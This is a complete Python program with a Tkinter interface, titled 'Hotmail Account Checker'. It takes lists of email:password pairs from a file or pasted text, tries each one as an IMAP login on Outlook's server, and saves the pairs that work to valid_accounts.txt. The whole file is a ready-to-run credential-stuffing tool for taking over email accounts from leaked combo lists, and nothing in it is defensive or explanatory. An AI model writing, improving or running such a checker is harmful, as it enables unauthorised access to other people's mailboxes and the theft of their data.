import imaplib
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading

def check_hotmail_login(email, password):
    """Attempts to log into a Hotmail account using IMAP."""
    try:
        mail = imaplib.IMAP4_SSL('outlook.office365.com')  # Hotmail/Outlook IMAP server
        mail.login(email, password)
        mail.logout()
        return True  # Login successful
    except:
        return False  # Login failed

def upload_file():
    """Opens a file dialog to select a file with credentials."""
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    process_accounts(file_path=file_path)

def process_accounts(file_path=None):
    """Processes accounts from a file or text box input."""
    output_file = 'valid_accounts.txt'  # File to store valid accounts
    failed_file = 'failed_accounts.txt'  # File to store failed accounts
    
    accounts = []

    # Read from file if uploaded
    if file_path:
        with open(file_path, 'r') as f:
            accounts += [line.strip().split(':') for line in f.readlines()]

    # Read from the text box input
    pasted_data = text_box.get("1.0", tk.END).strip()
    if pasted_data:
        accounts += [line.strip().split(':') for line in pasted_data.split("\n")]

    if not accounts:
        messagebox.showerror("No Accounts Found", "Please upload a file or paste credentials.")
        return

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)
    
    for index, credentials in enumerate(accounts, start=1):
        if len(credentials) != 2:
            continue  # Skip invalid lines

        email, password = credentials
        progress_label.config(text=f'Checking {index}/{total}: {email}...')
        root.update_idletasks()
        
        if check_hotmail_login(email, password):
            valid_accounts.append(f'{email}:{password}')
        else:
            failed_accounts.append(f'{email}:{password}')
    
    # Save valid and failed accounts to file
    with open(output_file, 'w') as f:
        f.write('\n'.join(valid_accounts))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed_accounts))
    
    progress_label.config(text=f'✅ Done! {len(valid_accounts)} valid, {len(failed_accounts)} failed.')
    messagebox.showinfo("Process Complete", "Account checking is done! Check valid_accounts.txt and failed_accounts.txt")

def create_gui():
    """Creates the main GUI for the application."""
    global root, progress_label, text_box
    root = tk.Tk()
    root.title("Hotmail Account Checker")
    root.geometry("500x300")

    label = tk.Label(root, text="Upload a file or paste credentials below:", font=("Arial", 12))
    label.pack(pady=5)

    upload_button = tk.Button(root, text="Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(pady=5)

    text_box = tk.Text(root, height=5, width=50)
    text_box.pack(pady=5)

    check_button = tk.Button(root, text="Check Accounts", command=lambda: process_accounts(), font=("Arial", 10), bg="lightgreen")
    check_button.pack(pady=5)

    progress_label = tk.Label(root, text="", font=("Arial", 10))
    progress_label.pack(pady=10)

    root.mainloop()

# Start GUI
create_gui()
